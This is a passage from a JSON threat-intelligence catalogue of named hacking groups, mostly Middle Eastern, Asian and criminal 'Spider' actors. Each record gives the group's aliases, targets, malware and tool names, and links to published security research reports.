Kuwait is also as one of Arid Viper\u00e2\u0080\u0099s victims.", "operations": [], "description": "spear phishing", "tools": [], "links": ["http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-arid-viper.pdf", "http://securityaffairs.co/wordpress/33785/cyber-crime/arid-viper-israel-sex-video.html", "https://securelist.com/blog/research/68817/the-desert-falcons-targeted-attacks/", "https://ti.360.com/upload/report/file/APTSWXLVJ8fnjoxck.pdf", "https://blog.lookout.com/blog/2017/02/16/viperrat-mobile-apt/", "https://securelist.com/blog/incidents/77562/breaking-the-weakest-link-of-the-strongest-chain/", "https://www.proofpoint.com/us/threat-insight/post/Operation-Arid-Viper-Slithers-Back-Into-View", "https://www.ci-project.org/blog/2017/3/4/arid-viper", "http://blog.talosintelligence.com/2017/06/palestine-delphi.html", "https://www.threatconnect.com/blog/kasperagent-malware-campaign/", "https://blog.trendmicro.com/trendlabs-security-intelligence/new-gnatspy-mobile-malware-family-discovered/"], "attck_id": null, "comment": "Related: Operation Advtravel"}, {"names": ["Volatile Cedar"], "targets": "USA, Canada, UK, Turkey, Lebanon and Israel. Nation-state/political-group interests", "operations": [], "description": "The modus operandi for this attacker group initially targets publicly facing web servers, with both automatic and manual vulnerability discovery. Once in control of a server, the attackers further penetrate the targeted internal network via various means, including manual online hacking as well as an automated USB infection mechanism.", "tools": ["Explosive"], "links": ["http://www.checkpoint.com/downloads/volatile-cedar-technical-report.pdf", "http://blog.checkpoint.com/2015/03/31/volatilecedar/"], "attck_id": null, "comment": "The main threat is sensitive data theft and cyber espionage"}, {"names": ["Syrian Electronic Army (SEA)", "Deadeye Jackal"], "targets": "Commercial, Financial, Media, Social Networking", "operations": [], "description": null, "tools": ["SeANux: Sea Shell (Basic Web Shell)", "Executer Webshell"], "links": ["http://www.crowdstrike.com/blog/dns-lifeblood-your-domain/", "https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf", "http://blogs.360.cn/post/Syrian_Electronic_Army.html"], "attck_id": null, "comment": null}, {"names": ["Cyber Caliphate Army (CCA)", "United Cyber Caliphate (UCC)", "Islamic State Hacking Division"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://ent.siteintelgroup.com/index.php?option=com_customproperties&view=search&task=tag&bind_to_category=content:37&tagId=697", "https://en.wikipedia.org/wiki/Islamic_State_Hacking_Division"], "attck_id": null, "comment": "Pro-ISIS"}, {"names": ["Ghost Jackal"], "targets": "Commercial, Energy, Financial", "operations": [], "description": null, "tools": [], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "attck_id": null, "comment": null}, {"names": ["Corsair Jackal"], "targets": "Commercial, Technology, Financial, Energy", "operations": [], "description": null, "tools": [], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "attck_id": null, "comment": null}, {"names": ["Extreme Jackal"], "targets": "Military, Government", "operations": [], "description": null, "tools": [], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "attck_id": null, "comment": null}, {"names": ["Electric Powder"], "targets": "Israel Electric Company", "operations": ["Electric Powder"], "description": "spreading malware via fake Facebook profiles and pages, breached websites, self-hosted and cloud based websites", "tools": ["Downloader", "keyloger"], "links": ["http://www.clearskysec.com/iec/", "https://www.riskiq.com/blog/analyst/powering-threat-investigations/"], "attck_id": null, "comment": null}, {"names": ["APT-C-23"], "targets": null, "operations": [], "description": null, "tools": ["KASPERAGENT and MICROPSIA", "Desert Scorpion"], "links": ["http://researchcenter.paloaltonetworks.com/2017/04/unit42-targeted-attacks-middle-east-using-kasperagent-micropsia/", "https://blog.lookout.com/frozencell-mobile-threat", "https://ti.360.net/blog/uploads/2017/09/22/f41a337e10e992f17986af386a62c7ad.pdf", "https://blog.lookout.com/desert-scorpion-google-play", "https://www.cyberscoop.com/hamas-spyware-desert-scorpion-apt-c-23-google-play-lookout/"], "attck_id": null, "comment": null}, {"names": ["APT-C-27", "Golden Rat", "Goldmouse"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.anquanke.com/post/id/94072", "https://securityaffairs.co/wordpress/74670/malware/apt-c-27-syria-espionage.html", "https://blog.360totalsecurity.com/en/the-sample-analysis-of-apt-c-27s-recent-attack/", "https://ti.360.net/blog/articles/apt-c-27-(goldmouse):-suspected-target-attack-against-the-middle-east-with-winrar-exploit-en/"], "attck_id": null, "comment": null}, {"names": ["Dark Caracal"], "targets": null, "operations": [], "description": null, "tools": ["Pallas Bandook CrossRAT Infected Documents "], "links": ["https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf"], "attck_id": null, "comment": null}, {"names": ["Tempting Cedar"], "targets": "people in Eastern European and Middle Eastern countries", "operations": [], "description": null, "tools": [], "links": ["https://blog.avast.com/avast-tracks-down-tempting-cedar-spyware"], "attck_id": null, "comment": null}, {"names": ["?"], "targets": "Palestinian authorities", "operations": ["Big Bang"], "description": null, "tools": ["MICROPSIA"], "links": ["https://blog.talosintelligence.com/2017/06/palestine-delphi.html", "https://research.checkpoint.com/apt-attack-middle-east-big-bang/"], "attck_id": null, "comment": null}, {"names": ["Sandcat"], "targets": null, "operations": [], "description": null, "tools": ["CHAINSHOT", "FinFisher/FinSpy", "CVE-2018-8589"], "links": ["https://securelist.com/zero-day-in-windows-kernel-transaction-manager-cve-2018-8611/89253/"], "attck_id": null, "comment": null}, {"names": ["Group WITRE"], "targets": "people from the Palestinian authority and UAE", "operations": [], "description": "1. Rar file with a geo-political name in Arabic, usually conerns the Palestinian Authority and Gaza 2. VBS/SCR with the same name.3. Decoy Doc contains copied content that was published by media outlet (modified content)4. Backdoor", "tools": [], "links": ["https://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html", "https://www.securityartwork.es/2019/01/18/grupo-wirte-atacando-a-oriente-medio/", " https://twitter.com/ClearskySec/status/1085160222233112577", " https://twitter.com/ItsReallyNick/status/1033413803470467072", "https://twitter.com/jeFF0Falltrades/status/1085247772582912003", "https://www.securityartwork.es/2019/01/25/wirte-group-attacking-the-middle-east/", "https://lab52.io/blog/wirte-group-attacking-the-middle-east/"], "attck_id": null, "comment": null}, {"names": ["ZooPark", "APT-C-38", "Saber Lion"], "targets": "Egypt, Jordan, Morocco, Lebanon, Iran, Iraqi Kurdistan", "operations": [], "description": "Android malware, Windows malware", "tools": [], "links": ["https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/05/24122414/ZooPark_for_public_final_edited.pdf", "http://blogs.360.cn/post/analysis-of-APT-C-38.html"], "attck_id": null, "comment": null}, {"names": ["APT-C-37", "Pat Bear", "Racquet Bear"], "targets": "DroidJack, SpyNote, SSLove, NJRAT, H-Worm", "operations": [], "description": null, "tools": [], "links": ["http://blogs.360.cn/post/analysis-of-apt-c-37.html", "https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Unknown/APT-C-37/26-08-19/APT-C-37%20analysis.md", "https://cybersecurity.att.com/blogs/labs-research/alien-labs-2019-analysis-of-threat-groups-molerats-and-apt-c-37"], "attck_id": null, "comment": null}]}}, {"other": {"actors": [{"names": ["Corsair Jackal"], "targets": "Tunesia", "operations": [], "description": null, "tools": [], "links": ["https://www.crowdstrike.com/blog/regional-conflict-and-cyber-blowback/"], "attck_id": null, "comment": null}, {"names": ["The Mask", "Careto"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://securelist.com/blog/research/58254/the-caretomask-apt-frequently-asked-questions/"], "attck_id": null, "comment": "Spanish Speaking Country"}, {"names": ["El Machete", "Machete", "Ragua"], "targets": "This threat actor targets military, government entities, and telecommunications providers, primarily in Latin America, for the purpose of espionage.", "operations": [], "description": null, "tools": [], "links": ["https://securelist.com/blog/research/66108/el-machete/", "https://www.cylance.com/en_us/blog/el-machete-malware-attacks-cut-through-latam.html", "https://www.welivesecurity.com/2019/08/05/sharpening-machete-cyberespionage/"], "attck_id": null, "comment": null}, {"names": ["Patchwork", "Dropping Elephant", "Chinastrats", "Capricorn Organisation ", "APT-C-09", "Viceroy Tiger", "Mahaboo", "Neon"], "targets": "global, including targets in the US, Europe, and the Middle East, many of the target countries are in the area surrounding the Indian subcontinent", "operations": ["Hangover", "Monsoon"], "description": null, "tools": ["Unknown Logger Public", "TINYTYPHON", "BADNEWS", "AutoIt backdoor"], "links": ["http://normanshark.com/wp-content/uploads/2013/08/NS-Unveiling-an-Indian-Cyberattack-Infrastructure_FINAL_Web.pdf", "https://www.cymmetria.com/patchwork-targeted-attack/", "https://blogs.forcepoint.com/security-labs/monsoon-analysis-apt-campaign", "https://securelist.com/the-dropping-elephant-actor/75328/", "http://blog.trendmicro.com/trendlabs-security-intelligence/untangling-the-patchwork-cyberespionage-group/", "http://www.sohu.com/a/211497788_764248", "https://ti.360.net/blog/articles/analysis-of-apt-c-09-target-china/", "https://mp.weixin.qq.com/s/AfGrEi-ViJxHEEDtSLvQSg", "https://blog.trendmicro.com/trendlabs-security-intelligence/deciphering-confucius-cyberespionage-operations/", "https://blog.trendmicro.com/trendlabs-security-intelligence/the-urpage-connection-to-bahamut-confucius-and-patchwork/", "https://blog.trendmicro.com/trendlabs-security-intelligence/confucius-update-new-tools-and-techniques-further-connections-with-patchwork/", "https://ti.qianxin.com/blog/articles/coronavirus-analysis-of-global-outbreak-related-cyber-attacks/", "https://unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/"], "attck_id": null, "comment": "Overlaps with BITTER (group)"}, {"names": ["Hellsing APT"], "targets": "Naikon", "operations": [], "description": null, "tools": [], "links": ["https://securelist.com/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back/69567/", "https://www.kaspersky.com/blog/deny-the-hellsing-apt-by-default/3851/"], "attck_id": null, "comment": null}, {"names": ["Wild Neutron", "Jripbot", "Morpho"], "targets": null, "operations": ["Sphinx Moth"], "description": null, "tools": ["Jiripbot", "Hesperbot"], "links": ["https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"], "attck_id": null, "comment": null}, {"names": ["Sykipot "], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sans.org/reading-room/whitepapers/malicious/detailed-analysis-sykipot-smartcard-proxy-variant-33919"], "attck_id": null, "comment": null}, {"names": ["Platinum", "TwoForOne", "DeadlyKiss"], "targets": "primarily targets governmental organizations, defense institutes, intelligence agencies, and telecommunication providers in South and Southeast Asia", "operations": [], "description": null, "tools": ["Hotpatching techniques", "CVE-2015-2545"], "links": ["https://download.microsoft.com/download/2/2/5/225BFE3E-E1DE-4F5B-A77B-71200928D209/Platinum%20feature%20article%20-%20Targeted%20attacks%20in%20South%20and%20Southeast%20Asia%20April%202016.pdf", "https://www.microsoft.com/security/blog/2017/06/07/platinum-continues-to-evolve-find-ways-to-maintain-invisibility/?source=mmpc", "https://securelist.com/platinum-is-back/91135/", "https://blog.telsy.com/deadlykiss-malware/"], "attck_id": null, "comment": null}, {"names": ["Danti"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://securelist.com/analysis/publications/74828/cve-2015-2545-overview-of-current-threats/"], "attck_id": null, "comment": null}, {"names": ["SVCMONDR"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://securelist.com/analysis/publications/74828/cve-2015-2545-overview-of-current-threats/"], "attck_id": null, "comment": null}, {"names": ["Transparent Tribe"], "targets": "Government of India diplomatic and military", "operations": [], "description": null, "tools": ["Crimson RAT"], "links": ["https://www.proofpoint.com/sites/default/files/proofpoint-operation-transparent-tribe-threat-insight-en.pdf", "https://www.fireeye.com/blog/threat-research/2016/06/apt_group_sends_spea.html", "https://blog.360totalsecurity.com/en/cyber-suspicious-cloud-behind-the-peace-treaty-transparent-tribe-reveals-cyber-attacks-in-afghanistan/", "https://ti.qianxin.com/blog/articles/analysis-of-apt-attack-activities-in-neighboring-countries-and-regions/"], "attck_id": null, "comment": null}, {"names": ["APT32", "Ocean Lotus", "APT-C-00", "SeaLotus ", "SectorF01"], "targets": "This threat actor targets organizations of interest to the Vietnamese government for espionage purposes. Victims have included human rights organizations, research institutes and maritime construction firms in China, and media organizations. Heavily targeting the automotive sector since 2018. ", "operations": ["Cobalt Kitty"], "description": null, "tools": ["Unique suite & OTS", "Microsoft ActiveMime file attachments", "KerrDown", "CobaltStrike", "SOUNDBITE", "Denis"], "links": ["https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html", "https://www.cybereason.com/labs-operation-cobalt-kitty-a-large-scale-apt-in-asia-carried-out-by-the-oceanlotus-group/", "https://www.scmagazineuk.com/ocean-lotus-groupapt-32-identified-as-vietnamese-apt-group/article/663565/", "https://www.brighttalk.com/webcast/10703/261205", "https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/", "https://www.welivesecurity.com/2018/03/13/oceanlotus-ships-new-backdoor/", "https://s.tencent.com/research/report/471.html", "https://unit42.paloaltonetworks.com/tracking-oceanlotus-new-downloader-kerrdown/", "https://blog.cystack.net/word-based-malware-attack/", "https://threatvector.cylance.com/en_us/home/report-oceanlotus-apt-group-leveraging-steganography.html", "https://blog.malwarebytes.com/threat-analysis/2019/04/funky-malware-format-found-in-ocean-lotus-sample/", "https://community.rsa.com/community/products/netwitness/blog/2018/01/30/apt32-continues-asean-targeting", "https://ti.qianxin.com/blog/articles/english-version-of-new-approaches-utilized-by-oceanLotus-to-target-vietnamese-environmentalist/", "https://threatrecon.nshc.net/2019/07/25/growth-of-sectorf01-groups-cyber-espionage-activities/"], "attck_id": null, "comment": null}, {"names": ["BlackOasis"], "targets": "Russia, Iraq, Afghanistan, Nigeria, Libya, Jordan, Tunisia, Saudi Arabia, Iran, Netherlands, Bahrain, United Kingdom and Angola", "operations": [], "description": null, "tools": ["CVE-2015-5119 \u00e2\u0080\u0093 June 2015", "CVE-2016-0984 \u00e2\u0080\u0093 June 2015", "CVE-2016-4117 \u00e2\u0080\u0093 May 2016", "CVE-2017-8759 \u00e2\u0080\u0093 Sept 2017", "CVE-2017-11292 \u00e2\u0080\u0093 Oct 2017", "FinSpy Malware"], "links": ["https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/"], "attck_id": null, "comment": null}, {"names": ["NEODYMIUM"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://blogs.technet.microsoft.com/mmpc/2016/12/14/twin-zero-day-attacks-promethium-and-neodymium-target-individuals-in-europe/"], "attck_id": null, "comment": null}, {"names": ["PROMETHIUM"], "targets": null, "operations": [], "description": null, "tools": ["StrongPity"], "links": ["https://securelist.com/on-the-strongpity-waterhole-attacks-targeting-italian-and-belgian-encryption-users/76147/", "https://blogs.technet.microsoft.com/mmpc/2016/12/14/twin-zero-day-attacks-promethium-and-neodymium-target-individuals-in-europe/", "https://www.welivesecurity.com/2017/12/08/strongpity-like-spyware-replaces-finfisher/", "https://citizenlab.ca/2018/03/bad-traffic-sandvines-packetlogic-devices-deploy-government-spyware-turkey-syria/", "https://threatvector.cylance.com/en_us/home/whack-a-mole-the-impact-of-threat-intelligence-on-adversaries.html", "https://www.alienvault.com/blogs/labs-research/newly-identified-strongpity-operations"], "attck_id": null, "comment": null}, {"names": ["Andromeda Spider"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "attck_id": null, "comment": null}, {"names": ["Bamboo Spider"], "targets": null, "operations": [], "description": null, "tools": ["Developed Panda Zeus"], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf page 19"], "attck_id": null, "comment": null}, {"names": ["Boson Spider"], "targets": null, "operations": [], "description": null, "tools": ["CoreBot"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15", "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report_BosonSpider.pdf"], "attck_id": null, "comment": "Criminal"}, {"names": ["Cobalt Spider", "Magecart Group 4"], "targets": "Point of Sale", "operations": [], "description": null, "tools": [], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-september-cobalt-spider/", "https://blog.malwarebytes.com/threat-analysis/2019/10/magecart-group-4:-a-link-with-cobalt-group/"], "attck_id": null, "comment": "Criminal, linked to Cobalt"}, {"names": ["Dextorous Spider"], "targets": "Retail", "operations": [], "description": null, "tools": [], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "attck_id": null, "comment": null}, {"names": ["Dundeon Spider"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf ", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-october-dungeon-spider/"], "attck_id": null, "comment": "Criminal"}, {"names": ["Grim Spider", "TEMP.MixMaster"], "targets": null, "operations": ["Onslow, North Carolina water", "Dataresolution.net (MSP for multiple US newpapers)"], "description": null, "tools": ["Ryuk"], "links": ["https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/", "https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html", "https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/", "https://blog.kryptoslogic.com/malware/2019/01/10/dprk-emotet.html", "https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/ryuk-ransomware-attack-rush-to-attribution-misses-the-point/", "https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/ryuk-exploring-the-human-connection/", "https://www.onwasa.com/DocumentCenter/View/3701/Scan-from-2018-10-15-08_08_13-A", "https://krebsonsecurity.com/2019/01/cloud-hosting-provider-dataresolution-net-battling-christmas-eve-ransomware-attack/"], "attck_id": null, "comment": "Criminal / Currently refers to Ryuk deployments following TrckBot infections"}, {"names": ["Hound Spider"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "attck_id": null, "comment": "Criminal"}, {"names": ["Indrik Spider", "TA505", "SectorJ04"], "targets": "Financial institutions, Retail", "operations": [], "description": null, "tools": ["Dridex", "FlawedAmmyy", "Remote Manipulator System"], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15", "https://www.crowdstrike.com/blog/big-game-hunting-the-evolution-of-indrik-spider-from-dridex-wire-fraud-to-bitpaymer-targeted-ransomware/", "https://ti.360.net/blog/articles/excel-4.0-macro-utilized-by-ta505-to-target-financial-institutions-recently-en/", "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter", "https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505", "https://www.proofpoint.com/us/threat-insight/post/ta505-abusing-settingcontent-ms-within-pdf-files-distribute-flawedammyy-rat", "https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times", "https://www.proofpoint.com/us/threat-insight/post/ta505-targets-us-retail-industry-personalized-attachments", "https://seguranca-informatica.pt/flawedammyy-leveraging-undetected-xlm-macros-as-an-infection-vehicle/", "https://e.cyberint.com/hubfs/CyberInt_Cybercriminals%20go%20after%20USA%20retailers_Report.pdf", "https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware", "https://blog.yoroi.company/research/the-stealthy-email-stealer-in-the-ta505-arsenal/", "https://blog.cyberint.com/threat-group-ta505-phishing-hijacks-remote-access-tools", "https://blog.yoroi.company/research/ta505-is-expanding-its-operations/", "https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/", "https://www.proofpoint.com/us/threat-insight/post/ta505-begins-summer-campaigns-new-pet-malware-downloader-andromut-uae-south"], "attck_id": null, "comment": "Criminal"}, {"names": ["Lunar Spider"], "targets": "Financial Crime", "operations": [], "description": null, "tools": ["IcedID (BokBot)"], "links": ["https://www.crowdstrike.com/blog/wizard-spider-lunar-spider-shared-proxy-module/", "https://www.crowdstrike.com/blog/bokbots-man-in-the-browser-overview/"], "attck_id": null, "comment": "Cooperation with Wizard Spider"}, {"names": ["Magnetic Spider"], "targets": "Financial Crime", "operations": [], "description": null, "tools": [], "links": ["http://go.crowdstrike.com/rs/281-OBQ-266/images/ReportGlobalThreatIntelligence.pdf"], "attck_id": null, "comment": "Russia based \"financial-crime motivated actor\" - Crowdstike 2014 Global TIR pg 57"}, {"names": ["Mimic Spider"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "attck_id": null, "comment": "Criminal"}, {"names": ["Monty Spider"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf page 19"], "attck_id": null, "comment": "Criminal"}, {"names": ["Mummy Spider", "TA542", "Mealybug"], "targets": null, "operations": [], "description": null, "tools": ["Emotet "], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf ", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-february-mummy-spider/", "https://crowdstrike.lookbookhq.com/web-global-threat-report-2019/crowdstrike-2019-gtr", "https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta542-banker-malware-distribution-service"], "attck_id": null, "comment": "Criminal"}, {"names": ["Overlord Spider"], "targets": "Entertainment and healthcare sector", "operations": [], "description": null, "tools": [], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf page 7"], "attck_id": null, "comment": "Criminal / Data Extortion"}, {"names": ["Pinchy Spider"], "targets": null, "operations": [], "description": null, "tools": ["GandCrab"], "links": ["https://www.crowdstrike.com/blog/pinchy-spider-adopts-big-game-hunting/"], "attck_id": null, "comment": "Criminal"}, {"names": ["Pizzo Spider"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "attck_id": null, "comment": "Criminal"}, {"names": ["Shark Spider"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "attck_id": null, "comment": "Criminal"}, {"names": ["Singing Spider"], "targets": "Commercial, Fiancial", "operations": [], "description": null, "tools": [], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "attck_id": null, "comment": "Criminal"}, {"names": ["Skeleton Spider", "FIN6", "ITG08", "Magecart Group 6"], "targets": null, "operations": [], "description": null, "tools": ["FrameworkPoS", "Vawtrak/Neverquest", "Ransomware"], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf ", "https://www.fireeye.com/blog/threat-research/2016/04/follow_the_money.html", "https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf", "https://webcache.googleusercontent.com/search?q=cache:wMkxJorBEKIJ:https://securityintelligence.com/x-force-iris-identifies-fin6-activity-on-pos-networks/+&cd=1&hl=en&ct=clnk&gl=uk&client=firefox-b", "https://exchange.xforce.ibmcloud.com/collection/FIN6-Financial-Crime-Actor-f55930eb9f4438efe9101a618d6a8703", "https://www.proofpoint.com/us/search/site?search_text=TA530&language=en", "https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html", "https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/", "https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/"], "attck_id": null, "comment": "Criminal"}, {"names": ["Static Spider"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "attck_id": null, "comment": "Criminal"}, {"names": ["Union Spider"], "targets": "Manufacturing", "operations": [], "description": null, "tools": [], "links": ["https://www.rsaconference.com/writable/presentations/file_upload/anf-t07b-the-art-of-attribution-identifying-and-pursuing-your-cyber-adversaries_final.pdf"], "attck_id": null, "comment": "Criminal"}, {"names": ["Wicked Spider"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-july-wicked-spider/"], "attck_id": null, "comment": "Criminal"}, {"names": ["Wizard Spider"], "targets": null, "operations": [], "description": null, "tools": ["TrickBot"], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf page 19", "https://crowdstrike.lookbookhq.com/web-global-threat-report-2019/crowdstrike-2019-gtr page 52", "https://www.crowdstrike.com/blog/wizard-spider-lunar-spider-shared-proxy-module/", "https://www.crowdstrike.com/blog/wizard-spider-adds-new-feature-to-ryuk-ransomware/"], "attck_id": null, "comment": "Criminal"}, {"names": ["Wold Spider"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "attck_id": null, "comment": "Criminal"}, {"names": ["Zombie Spider", "Pytor Levashov ", "Kelihos"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15; https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2018GlobalThreatReport.pdf page 18", "https://www.crowdstrike.com/blog/inside-the-takedown-of-zombie-spider-and-the-kelihos-botnet/"], "attck_id": null, "comment": "Criminal"}, {"names": ["Curious Jackal"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "attck_id": null, "comment": "Activist"}, {"names": ["Extreme Jackal"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "attck_id": null, "comment": "Activist"}, {"names": ["Gekko Jackal"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "attck_id": null, "comment": "Activist"}, {"names": ["Shifty Jackal"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.sig-switzerland.ch/wp-content/uploads/2016/03/SIGS_SOC_Forum_Sep2017_CrowdStrike_On_the_Hunt_for_Pandas_Kittens_and_Bears.pdf see slide 15"], "attck_id": null, "comment": "Activist"}, {"names": ["Mythic\u00c2\u00a0Leopard"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.crowdstrike.com/blog/adversary-of-the-month-for-may/"], "attck_id": null, "comment": null}, {"names": ["GravityRAT"], "targets": "India", "operations": [], "description": null, "tools": [], "links": ["https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html", "https://www.cyberscoop.com/gravityrat-cisco-talos-india-pakistan/"], "attck_id": null, "comment": null}, {"names": ["SilverTerrier"], "targets": null, "operations": [], "description": null, "tools": ["Predator Pain", "Pony", "KeyBase", "ISpySoftware", "ISR Stealer", "Agent Tesla", "LokiBot", "Zeus and Atmos", "NetWire", "DarkComet and NanoCore"], "links": ["https://www.paloaltonetworks.com/resources/whitepapers/unit42-silverterrier-rise-of-nigerian-business-email-compromise.html", "https://unit42.paloaltonetworks.com/silverterrier-covid-19-themed-business-email-compromise/"], "attck_id": null, "comment": "Criminal"}, {"names": ["InvisiMole"], "targets": "Russia, Ukraine", "operations": [], "description": null, "tools": [], "links": ["https://www.welivesecurity.com/2018/06/07/invisimole-equipped-spyware-undercover/"], 